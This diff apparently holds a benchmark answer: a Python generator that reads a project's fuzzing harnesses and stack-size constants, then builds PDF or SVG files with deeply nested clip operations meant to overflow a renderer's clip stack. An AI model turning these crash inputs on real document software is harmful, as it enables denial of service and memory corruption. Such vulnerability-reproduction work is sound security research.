@@ -1,349 +1,429 @@
 import os
 import re
 import tarfile
-import zipfile
-from typing import Dict, Iterable, List, Optional, Tuple
+import tempfile
+import zlib
+from typing import List, Optional, Tuple
+
+
+_TEXT_EXTS = {
+    ".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".hxx", ".inl", ".ipp",
+    ".m", ".mm", ".rs", ".go", ".java", ".py", ".js", ".ts",
+}
+_MAX_SCAN_BYTES = 2 * 1024 * 1024
+
+
+def _is_probably_text(data: bytes) -> bool:
+    if not data:
+        return True
+    if b"\x00" in data:
+        return False
+    sample = data[:4096]
+    bad = 0
+    for b in sample:
+        if b in (9, 10, 13):
+            continue
+        if b < 32 or b == 127:
+            bad += 1
+    return bad * 100 < len(sample) * 5
+
+
+def _safe_extract_tar(tar: tarfile.TarFile, path: str) -> None:
+    base = os.path.realpath(path)
+    for m in tar.getmembers():
+        name = m.name
+        if not name or name.startswith("/") or name.startswith("\\"):
+            continue
+        dest = os.path.realpath(os.path.join(path, name))
+        if not (dest == base or dest.startswith(base + os.sep)):
+            continue
+        tar.extract(m, path=path)
+
+
+def _maybe_unpack(src_path: str) -> str:
+    if os.path.isdir(src_path):
+        return src_path
+    td = tempfile.mkdtemp(prefix="src_")
+    with tarfile.open(src_path, "r:*") as tf:
+        _safe_extract_tar(tf, td)
+    # If tarball has a single top-level directory, use it as root
+    try:
+        entries = [e for e in os.listdir(td) if e not in (".", "..")]
+        if len(entries) == 1:
+            root = os.path.join(td, entries[0])
+            if os.path.isdir(root):
+                return root
+    except Exception:
+        pass
+    return td
+
+
+def _walk_files(root: str) -> List[str]:
+    out = []
+    for dirpath, dirnames, filenames in os.walk(root):
+        dn = os.path.basename(dirpath)
+        if dn in {".git", ".svn", ".hg", "out", "build", "cmake-build-debug", "cmake-build-release"}:
+            dirnames[:] = []
+            continue
+        # prune some common large dirs
+        pruned = []
+        for d in dirnames:
+            if d in {".git", ".svn", ".hg", "out", "build", "dist", "node_modules", "target"}:
+                continue
+            pruned.append(d)
+        dirnames[:] = pruned
+        for fn in filenames:
+            out.append(os.path.join(dirpath, fn))
+    return out
+
+
+def _read_file_head(path: str, max_bytes: int = _MAX_SCAN_BYTES) -> bytes:
+    try:
+        with open(path, "rb") as f:
+            return f.read(max_bytes)
+    except Exception:
+        return b""
+
+
+def _find_fuzzer_sources(root: str) -> List[str]:
+    files = _walk_files(root)
+    candidates = []
+    needle = b"LLVMFuzzerTestOneInput"
+    for p in files:
+        ext = os.path.splitext(p)[1].lower()
+        if ext not in _TEXT_EXTS:
+            continue
+        data = _read_file_head(p)
+        if needle in data:
+            candidates.append(p)
+    # prioritize ones with clip/layer/pdf/svg keywords in name/content
+    def score(p: str) -> int:
+        s = 0
+        lp = p.lower()
+        for k in ("clip", "layer", "pdf", "svg", "xps", "canvas", "gfx", "render"):
+            if k in lp:
+                s += 5
+        data = _read_file_head(p, 512 * 1024)
+        dl = data.lower()
+        for k in (b"clip", b"layer", b"%pdf", b"svg", b"xml", b"mupdf", b"qpdf", b"poppler", b"pdfium"):
+            if k in dl:
+                s += 2
+        return -s
+
+    candidates.sort(key=score)
+    return candidates
+
+
+def _find_dict_files(root: str) -> List[str]:
+    files = _walk_files(root)
+    out = []
+    for p in files:
+        if p.lower().endswith(".dict"):
+            out.append(p)
+    return out
+
+
+def _extract_dict_tokens(dict_bytes: bytes) -> List[bytes]:
+    # libFuzzer dict format often has "TOKEN"
+    tokens = []
+    for m in re.finditer(rb'"([^"\r\n]{1,200})"', dict_bytes):
+        tokens.append(m.group(1))
+    return tokens
+
+
+def _infer_input_type(root: str, fuzzer_paths: List[str], dict_paths: List[str]) -> Tuple[str, bool]:
+    # returns (type, expects_full_doc)
+    # type in {"pdf","svg","unknown"}
+    dict_tokens = []
+    for dp in dict_paths[:5]:
+        data = _read_file_head(dp, 512 * 1024)
+        if data:
+            dict_tokens.extend(_extract_dict_tokens(data))
+
+    dtl = b"\n".join(dict_tokens).lower()
+    if b"%pdf" in dtl or b"endobj" in dtl or b"xref" in dtl or b"stream" in dtl:
+        return "pdf", True
+    if b"<svg" in dtl or b"</svg" in dtl or b"clip-path" in dtl or b"xmlns" in dtl:
+        return "svg", True
+
+    # Examine best fuzzer source
+    fp = fuzzer_paths[0] if fuzzer_paths else ""
+    data = _read_file_head(fp, 1024 * 1024) if fp else b""
+    dl = data.lower()
+
+    if b"<svg" in dl or b"svg" in dl and (b"xml" in dl or b"dom" in dl):
+        return "svg", True
+
+    if b"%pdf" in dl or b"pdf" in dl:
+        # Decide whether it expects a full PDF document or just a content stream
+        full_doc_markers = (
+            b"open_document", b"load_document", b"pdfdoc", b"fz_open_document", b"qpdf",
+            b"pdfium", b"poppler", b"xref", b"trailer", b"catalog", b"/type /catalog",
+        )
+        content_only_markers = (
+            b"content stream", b"parse_content", b"run_content", b"interpret_content",
+            b"contents only", b"process_contents",
+        )
+        if any(m in dl for m in full_doc_markers):
+            return "pdf", True
+        if any(m in dl for m in content_only_markers):
+            return "pdf", False
+        # Most PDF fuzzers take full documents
+        return "pdf", True
+
+    # Fall back based on source keywords elsewhere
+    return "pdf", True
+
+
+def _find_relevant_source_snippets(root: str, max_files: int = 20) -> List[str]:
+    needles = [
+        b"clip mark", b"clip_mark", b"clipmark",
+        b"layer/clip", b"layer clip", b"layer_clip",
+        b"layerclip", b"clip stack", b"clip_stack",
+    ]
+    files = _walk_files(root)
+    rel = []
+    for p in files:
+        ext = os.path.splitext(p)[1].lower()
+        if ext not in _TEXT_EXTS:
+            continue
+        data = _read_file_head(p, 1024 * 1024)
+        if not data or not _is_probably_text(data):
+            continue
+        dl = data.lower()
+        if any(n in dl for n in needles):
+            rel.append(p)
+            if len(rel) >= max_files:
+                break
+    return rel
+
+
+def _guess_stack_capacity_from_files(paths: List[str]) -> Optional[int]:
+    nums = []
+    for p in paths:
+        data = _read_file_head(p, 1024 * 1024)
+        if not data:
+            continue
+        try:
+            text = data.decode("utf-8", errors="ignore")
+        except Exception:
+            continue
+        for line in text.splitlines():
+            ll = line.lower()
+            if ("stack" not in ll) or not (("clip" in ll) or ("layer" in ll) or ("nest" in ll) or ("depth" in ll)):
+                continue
+            m = re.search(r"\[\s*(\d{2,7})\s*\]", line)
+            if m:
+                v = int(m.group(1))
+                if 2 <= v <= 1000000:
+                    nums.append(v)
+                    continue
+            # std::array<..., N> or template parameter
+            m = re.search(r"array\s*<[^>]*,\s*(\d{2,7})\s*>", line)
+            if m:
+                v = int(m.group(1))
+                if 2 <= v <= 1000000:
+                    nums.append(v)
+                    continue
+            # defines / constexpr / const
+            m = re.search(r"\b(?:kMax|MAX|LIMIT|SIZE|CAPACITY|DEPTH)\w*\s*(?:=|\s)\s*(\d{2,7})\b", line)
+            if m:
+                v = int(m.group(1))
+                if 2 <= v <= 1000000:
+                    nums.append(v)
+                    continue
+    if not nums:
+        return None
+    # choose the most plausible (often large-ish, but not absurd)
+    nums.sort()
+    # prefer values around 256..131072 if present
+    for target_low, target_high in ((1000, 200000), (200, 400000), (2, 1000000)):
+        cand = [n for n in nums if target_low <= n <= target_high]
+        if cand:
+            return max(cand)
+    return max(nums)
+
+
+def _guess_pdf_trigger_op(root: str, relevant_files: List[str]) -> str:
+    # returns "q" or "W"
+    # Heuristic: if push_*clip*mark is tied to save/restore/q, use q; else use W.
+    # Find an identifier like push_clip_mark or PushClipMark
+    ident = None
+    for p in relevant_files:
+        data = _read_file_head(p, 1024 * 1024)
+        if not data:
+            continue
+        if not _is_probably_text(data):
+            continue
+        m = re.search(rb"\b(push\w*clip\w*mark\w*)\b", data, flags=re.IGNORECASE)
+        if m:
+            ident = m.group(1).decode("ascii", errors="ignore")
+            if ident:
+                break
+
+    if not ident:
+        # fallback: scan for "q" mention with clip mark
+        for p in relevant_files:
+            data = _read_file_head(p, 512 * 1024).lower()
+            if b"clip mark" in data and (b"case 'q'" in data or b" op_q" in data or b" save" in data):
+                return "q"
+        return "W"
+
+    # Find call sites of ident across repo (limited)
+    call_paths = []
+    files = _walk_files(root)
+    needle = ident.encode("ascii", errors="ignore") + b"("
+    for p in files:
+        ext = os.path.splitext(p)[1].lower()
+        if ext not in _TEXT_EXTS:
+            continue
+        data = _read_file_head(p, 1024 * 1024)
+        if needle in data:
+            call_paths.append(p)
+            if len(call_paths) >= 15:
+                break
+
+    for p in call_paths:
+        data = _read_file_head(p, 1024 * 1024)
+        if not data:
+            continue
+        dl = data.lower()
+        idx = dl.find(needle.lower())
+        if idx < 0:
+            continue
+        window = dl[max(0, idx - 400): idx + 200]
+        if b"case 'q'" in window or b" op_q" in window or b" save" in window or b"gsave" in window:
+            return "q"
+        if b"case 'w'" in window or b" clip" in window:
+            return "W"
+
+    # If any relevant file suggests save/restore semantics with clip mark, choose q
+    for p in relevant_files:
+        data = _read_file_head(p, 512 * 1024).lower()
+        if b"clip mark" in data and (b"save" in data or b"restore" in data or b"gsave" in data):
+            return "q"
+
+    return "W"
+
+
+def _build_pdf_with_single_stream(stream_data: bytes, compress: bool = True) -> bytes:
+    if compress:
+        comp = zlib.compress(stream_data, level=9)
+        dict_part = f"<< /Length {len(comp)} /Filter /FlateDecode >>".encode("ascii")
+        payload = comp
+    else:
+        dict_part = f"<< /Length {len(stream_data)} >>".encode("ascii")
+        payload = stream_data
+
+    parts = []
+    parts.append(b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n")
+
+    offsets = [0]  # placeholder for obj 0
+
+    def add_obj(objnum: int, body: bytes) -> None:
+        offsets.append(sum(len(x) for x in parts))
+        parts.append(f"{objnum} 0 obj\n".encode("ascii"))
+        parts.append(body)
+        if not body.endswith(b"\n"):
+            parts.append(b"\n")
+        parts.append(b"endobj\n")
+
+    add_obj(1, b"<< /Type /Catalog /Pages 2 0 R >>\n")
+    add_obj(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>\n")
+    add_obj(3, b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 1 1] /Contents 4 0 R >>\n")
+
+    obj4 = b"".join([
+        dict_part,
+        b"\nstream\n",
+        payload,
+        b"\nendstream\n",
+    ])
+    add_obj(4, obj4)
+
+    xref_pos = sum(len(x) for x in parts)
+    xref = []
+    xref.append(b"xref\n")
+    xref.append(b"0 5\n")
+    xref.append(b"0000000000 65535 f \n")
+    for i in range(1, 5):
+        xref.append(f"{offsets[i]:010d} 00000 n \n".encode("ascii"))
+    xref_bytes = b"".join(xref)
+    parts.append(xref_bytes)
+
+    trailer = b"".join([
+        b"trailer\n",
+        b"<< /Size 5 /Root 1 0 R >>\n",
+        b"startxref\n",
+        f"{xref_pos}\n".encode("ascii"),
+        b"%%EOF\n",
+    ])
+    parts.append(trailer)
+
+    return b"".join(parts)
+
+
+def _build_pdf_content_payload(op: str, n: int) -> bytes:
+    if op == "q":
+        return b"q\n" * n
+    # default W path clip
+    return b"0 0 1 1 re W n\n" * n
+
+
+def _build_svg_payload(n: int) -> bytes:
+    # Keep tags short-ish. Deep nesting with repeated clip-path usage.
+    head = b'<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1">\n'
+    defs = b'<defs><clipPath id="c"><rect width="1" height="1"/></clipPath></defs>\n'
+    open_g = b'<g clip-path="url(#c)">\n'
+    close_g = b"</g>\n"
+    # Put a tiny element inside to keep structure valid
+    inner = b'<rect width="1" height="1"/>\n'
+    return b"".join([
+        head,
+        defs,
+        open_g * n,
+        inner,
+        close_g * n,
+        b"</svg>\n",
+    ])
 
 
 class Solution:
-    _TEXT_EXTS = {
-        ".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx",
-        ".inc", ".inl", ".ipp", ".mm", ".m",
-        ".rs", ".go", ".java", ".kt", ".swift",
-        ".py", ".js", ".ts",
-        ".cmake", ".txt", ".md", ".rst", ".yaml", ".yml", ".gn", ".gni", ".bazel", ".bzl",
-    }
-
     def solve(self, src_path: str) -> bytes:
-        files = self._load_sources(src_path)
-        fuzzer_texts = self._extract_fuzzer_texts(files)
-        fmt = self._guess_format(files, fuzzer_texts)
-        limit = self._guess_nesting_limit(files, fuzzer_texts)
-        depth = max(64, limit + 64)
+        root = _maybe_unpack(src_path)
 
-        if fmt == "pdf":
-            return self._gen_pdf(depth)
-        elif fmt == "cmd0":
-            # Many command-driven fuzzers use FuzzedDataProvider; all-zero input often drives op==0 repeatedly.
-            # Provide enough bytes to sustain many iterations even if each iteration consumes multiple bytes.
-            # Keep under a few MB.
-            nbytes = min(4_000_000, max(256_000, depth * 16))
-            return b"\x00" * nbytes
+        fuzzer_paths = _find_fuzzer_sources(root)
+        dict_paths = _find_dict_files(root)
+        input_type, expects_full_doc = _infer_input_type(root, fuzzer_paths, dict_paths)
+
+        relevant = _find_relevant_source_snippets(root, max_files=20)
+        cap = _guess_stack_capacity_from_files(relevant) if relevant else None
+
+        if cap is None:
+            # Reasonable default that likely exceeds common 16-bit-ish or fixed buffer limits
+            n = 80000
         else:
-            return self._gen_svg(depth)
+            # exceed capacity; avoid absurd sizes
+            n = cap + 16
+            if n < 1024:
+                n = 4096
+            if n > 200000:
+                n = 200000
 
-    def _load_sources(self, src_path: str) -> List[Tuple[str, bytes]]:
-        if os.path.isdir(src_path):
-            return self._load_from_dir(src_path)
-        if tarfile.is_tarfile(src_path):
-            return self._load_from_tar(src_path)
-        if zipfile.is_zipfile(src_path):
-            return self._load_from_zip(src_path)
-        # Fallback: try to read as a single file; may still contain code.
-        try:
-            with open(src_path, "rb") as f:
-                data = f.read()
-            return [(os.path.basename(src_path), data)]
-        except Exception:
-            return []
+        if input_type == "svg":
+            # SVG payload is uncompressed; keep it moderate
+            if n > 60000:
+                n = 60000
+            return _build_svg_payload(n)
 
-    def _is_text_candidate(self, name: str, size: int) -> bool:
-        base = os.path.basename(name)
-        lower = base.lower()
-        if base in ("CMakeLists.txt", "BUILD", "WORKSPACE"):
-            return True
-        _, ext = os.path.splitext(lower)
-        if ext in self._TEXT_EXTS:
-            return True
-        if "fuzz" in lower and ext in (".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".txt", ".md"):
-            return True
-        if ext == "" and ("fuzz" in lower or "cmake" in lower or lower.endswith("makefile")):
-            return True
-        return False
+        # PDF or unknown: craft PDF content/stream
+        op = _guess_pdf_trigger_op(root, relevant)
+        content = _build_pdf_content_payload(op, n)
 
-    def _load_from_dir(self, root: str) -> List[Tuple[str, bytes]]:
-        out: List[Tuple[str, bytes]] = []
-        max_file_size = 2_000_000
-        for dirpath, _, filenames in os.walk(root):
-            for fn in filenames:
-                path = os.path.join(dirpath, fn)
-                try:
-                    st = os.stat(path)
-                except Exception:
-                    continue
-                if st.st_size <= 0 or st.st_size > max_file_size:
-                    continue
-                rel = os.path.relpath(path, root)
-                if not self._is_text_candidate(rel, st.st_size):
-                    continue
-                try:
-                    with open(path, "rb") as f:
-                        out.append((rel, f.read()))
-                except Exception:
-                    continue
-        return out
+        # If unsure, append an alternate trigger (cheap) after the main one
+        if op != "q":
+            content += (b"q\n" * min(n, 120000))
 
-    def _load_from_tar(self, tar_path: str) -> List[Tuple[str, bytes]]:
-        out: List[Tuple[str, bytes]] = []
-        max_file_size = 2_000_000
-        try:
-            with tarfile.open(tar_path, "r:*") as tf:
-                for m in tf:
-                    if not m.isfile():
-                        continue
-                    if m.size <= 0 or m.size > max_file_size:
-                        continue
-                    name = m.name
-                    if not self._is_text_candidate(name, m.size):
-                        continue
-                    try:
-                        f = tf.extractfile(m)
-                        if f is None:
-                            continue
-                        out.append((name, f.read()))
-                    except Exception:
-                        continue
-        except Exception:
-            pass
-        return out
-
-    def _load_from_zip(self, zip_path: str) -> List[Tuple[str, bytes]]:
-        out: List[Tuple[str, bytes]] = []
-        max_file_size = 2_000_000
-        try:
-            with zipfile.ZipFile(zip_path, "r") as zf:
-                for zi in zf.infolist():
-                    if zi.is_dir():
-                        continue
-                    if zi.file_size <= 0 or zi.file_size > max_file_size:
-                        continue
-                    name = zi.filename
-                    if not self._is_text_candidate(name, zi.file_size):
-                        continue
-                    try:
-                        with zf.open(zi, "r") as f:
-                            out.append((name, f.read()))
-                    except Exception:
-                        continue
-        except Exception:
-            pass
-        return out
-
-    def _extract_fuzzer_texts(self, files: List[Tuple[str, bytes]]) -> List[str]:
-        out: List[str] = []
-        for name, data in files:
-            if b"LLVMFuzzerTestOneInput" not in data:
-                continue
-            out.append(self._to_text(data))
-        return out
-
-    def _to_text(self, b: bytes) -> str:
-        try:
-            return b.decode("utf-8", errors="ignore")
-        except Exception:
-            try:
-                return b.decode("latin1", errors="ignore")
-            except Exception:
-                return ""
-
-    def _guess_format(self, files: List[Tuple[str, bytes]], fuzzer_texts: List[str]) -> str:
-        texts = fuzzer_texts[:] if fuzzer_texts else []
-
-        if not texts:
-            # Use a few most relevant-looking files
-            scored: List[Tuple[int, str]] = []
-            kw = (b"fuzz", b"LLVMFuzzerTestOneInput", b"FuzzedDataProvider", b"svg", b"pdf", b"clip")
-            for name, data in files:
-                name_l = name.lower().encode("utf-8", errors="ignore")
-                score = 0
-                for k in kw:
-                    if k in data:
-                        score += 3
-                    if k in name_l:
-                        score += 2
-                if score > 0:
-                    scored.append((score, self._to_text(data)))
-            scored.sort(reverse=True, key=lambda x: x[0])
-            texts = [t for _, t in scored[:8]]
-
-        combined = "\n".join(texts).lower()
-
-        svg_score = 0
-        pdf_score = 0
-        cmd_score = 0
-        json_score = 0
-
-        def inc(cond: bool, var: str, amt: int) -> None:
-            nonlocal svg_score, pdf_score, cmd_score, json_score
-            if not cond:
-                return
-            if var == "svg":
-                svg_score += amt
-            elif var == "pdf":
-                pdf_score += amt
-            elif var == "cmd":
-                cmd_score += amt
-            elif var == "json":
-                json_score += amt
-
-        inc("svg" in combined, "svg", 3)
-        inc("sksvg" in combined, "svg", 6)
-        inc("tinyxml" in combined or "libxml" in combined or "expat" in combined, "svg", 2)
-        inc("clip-path" in combined or "clippath" in combined, "svg", 6)
-        inc("xml" in combined and "svg" in combined, "svg", 2)
-
-        inc("pdf" in combined, "pdf", 3)
-        inc("fpdf_" in combined or "pdfium" in combined, "pdf", 8)
-        inc("poppler" in combined or "mupdf" in combined or "fz_open_document" in combined, "pdf", 6)
-
-        inc("fuzzeddataprovider" in combined, "cmd", 8)
-        inc("switch" in combined and "case" in combined, "cmd", 2)
-
-        inc("json" in combined, "json", 3)
-        inc("lottie" in combined or "skottie" in combined or "rlottie" in combined, "json", 8)
-        inc("nlohmann" in combined or "rapidjson" in combined, "json", 4)
-
-        # Prefer explicit file-parsing formats when identified.
-        if pdf_score >= max(svg_score, cmd_score, json_score) and pdf_score >= 8:
-            return "pdf"
-        if svg_score >= max(pdf_score, cmd_score, json_score) and svg_score >= 8:
-            return "svg"
-        if cmd_score >= max(svg_score, pdf_score, json_score) and cmd_score >= 8:
-            return "cmd0"
-        if json_score >= max(svg_score, pdf_score, cmd_score) and json_score >= 8:
-            # Unknown JSON schema; SVG is more likely to exercise clip stacks in many projects.
-            return "svg"
-        return "svg"
-
-    def _guess_nesting_limit(self, files: List[Tuple[str, bytes]], fuzzer_texts: List[str]) -> int:
-        # Try to find a constant related to nesting depth / clip stack limits.
-        relevant_texts: List[str] = []
-        key_bytes = [
-            b"clip mark", b"clipmark", b"pushclipmark", b"push_clip_mark",
-            b"layer/clip", b"layer clip", b"clip stack", b"layer stack",
-            b"nesting depth", b"nesting", b"nest", b"depth",
-        ]
-
-        for name, data in files:
-            dn = data.lower()
-            if any(k in dn for k in key_bytes):
-                relevant_texts.append(self._to_text(data))
-
-        if fuzzer_texts:
-            relevant_texts.extend(fuzzer_texts)
-
-        # Limit scanning size
-        if len(relevant_texts) > 30:
-            relevant_texts = relevant_texts[:30]
-
-        candidates: List[Tuple[int, int]] = []
-        define_re = re.compile(r"(?i)#\s*define\s+\w*(?:NEST|DEPTH|STACK|CLIP)\w*\s+(\d{2,7})")
-        assign_re = re.compile(r"(?i)\b(?:k?max(?:imum)?)[\w]*(?:nest(?:ing)?|depth|stack)[\w]*\s*(?:=|:)\s*(\d{2,7})")
-        generic_re = re.compile(r"(\d{2,7})")
-
-        def score_line(line: str) -> int:
-            l = line.lower()
-            s = 0
-            if "nest" in l:
-                s += 5
-            if "depth" in l:
-                s += 5
-            if "clip" in l:
-                s += 4
-            if "layer" in l:
-                s += 4
-            if "stack" in l:
-                s += 3
-            if "mark" in l:
-                s += 2
-            if "max" in l or "limit" in l:
-                s += 2
-            return s
-
-        for t in relevant_texts:
-            for line in t.splitlines():
-                if not line:
-                    continue
-                lline = line.lower()
-                if ("nest" not in lline and "depth" not in lline and "stack" not in lline) or ("clip" not in lline and "layer" not in lline and "mark" not in lline and "stack" not in lline):
-                    continue
-                s = score_line(line)
-                if s <= 0:
-                    continue
-
-                for m in define_re.finditer(line):
-                    n = int(m.group(1))
-                    if 64 <= n <= 500_000:
-                        candidates.append((s + 6, n))
-                for m in assign_re.finditer(line):
-                    n = int(m.group(1))
-                    if 64 <= n <= 500_000:
-                        candidates.append((s + 5, n))
-                for m in generic_re.finditer(line):
-                    n = int(m.group(1))
-                    if 64 <= n <= 500_000:
-                        candidates.append((s, n))
-
-        if not candidates:
-            # Strong prior based on typical implementations and the provided ground-truth size.
-            return 32768
-
-        candidates.sort(key=lambda x: (x[0], x[1]), reverse=True)
-        best_score = candidates[0][0]
-        filtered = [n for s, n in candidates if s >= best_score - 1 and 64 <= n <= 200_000]
-        if not filtered:
-            filtered = [n for s, n in candidates if s >= best_score - 2 and 64 <= n <= 500_000]
-        if not filtered:
-            return min(200_000, max(1024, candidates[0][1]))
-        # Choose the largest among the best-scoring values to avoid underestimating.
-        return min(200_000, max(filtered))
-
-    def _gen_svg(self, depth: int) -> bytes:
-        # Intentionally leave tags unclosed to reduce size; most XML parsers will process all start tags until EOF.
-        prefix = (
-            b'<svg xmlns="http://www.w3.org/2000/svg">'
-            b'<defs><clipPath id="a"><rect width="1" height="1"/></clipPath></defs>'
-        )
-        open_tag = b'<g clip-path="url(#a)">'
-        return prefix + (open_tag * depth)
-
-    def _gen_pdf(self, depth: int) -> bytes:
-        # Minimal single-page PDF with a content stream containing repeated 'q' + rectangle clip.
-        # Attempt to grow graphics/clip nesting.
-        op = b"q 0 0 1 1 re W n\n"
-        stream = op * depth
-
-        def obj(n: int, body: bytes) -> bytes:
-            return f"{n} 0 obj\n".encode() + body + b"\nendobj\n"
-
-        parts: List[bytes] = []
-        parts.append(b"%PDF-1.4\n%\xE2\xE3\xCF\xD3\n")
-
-        offsets: List[int] = [0]  # xref requires object 0
-        cur = len(parts[0])
-
-        o1 = obj(1, b"<< /Type /Catalog /Pages 2 0 R >>")
-        offsets.append(cur); parts.append(o1); cur += len(o1)
-
-        o2 = obj(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
-        offsets.append(cur); parts.append(o2); cur += len(o2)
-
-        o3 = obj(3, b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 1 1] /Contents 4 0 R /Resources << >> >>")
-        offsets.append(cur); parts.append(o3); cur += len(o3)
-
-        o4_body = b"<< /Length " + str(len(stream)).encode() + b" >>\nstream\n" + stream + b"endstream"
-        o4 = obj(4, o4_body)
-        offsets.append(cur); parts.append(o4); cur += len(o4)
-
-        xref_start = cur
-        xref = [b"xref\n0 5\n"]
-        xref.append(b"0000000000 65535 f \n")
-        for off in offsets[1:]:
-            xref.append(f"{off:010d} 00000 n \n".encode())
-        xref_bytes = b"".join(xref)
-
-        trailer = (
-            b"trailer\n<< /Size 5 /Root 1 0 R >>\n"
-            b"startxref\n" + str(xref_start).encode() + b"\n%%EOF\n"
-        )
-        return b"".join(parts) + xref_bytes + trailer
+        if expects_full_doc:
+            return _build_pdf_with_single_stream(content, compress=True)
+        else:
+            return content
